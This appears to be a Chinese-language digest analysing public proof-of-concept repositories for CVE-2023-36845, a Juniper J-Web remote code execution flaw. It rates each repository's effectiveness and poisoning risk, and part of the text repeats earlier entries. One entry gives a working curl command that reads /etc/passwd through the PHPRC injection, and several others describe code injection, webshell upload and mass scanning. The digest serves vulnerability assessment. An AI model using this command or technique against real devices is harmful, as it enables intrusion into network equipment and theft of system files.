4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

